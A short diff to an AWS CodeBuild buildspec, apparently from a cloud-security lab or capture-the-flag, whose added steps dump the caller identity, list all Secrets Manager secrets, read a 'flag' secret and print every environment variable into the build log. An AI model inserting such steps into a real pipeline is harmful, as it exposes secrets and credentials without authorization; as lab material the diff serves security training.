@@ -3,9 +3,12 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running build"
+      - set +e
+      - echo "=== identity ==="
       - aws sts get-caller-identity
-      - aws secretsmanager list-secrets --region us-east-1 --query "SecretList[?contains(Name,'codebuild_lab_5')].Name" --output text
-      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text || true
+      - echo "=== secrets ==="
+      - aws secretsmanager list-secrets --region us-east-1 2>&1 || true
+      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 2>&1 || true
+      - echo "=== env ==="
       - env | sort
       - echo "Done"
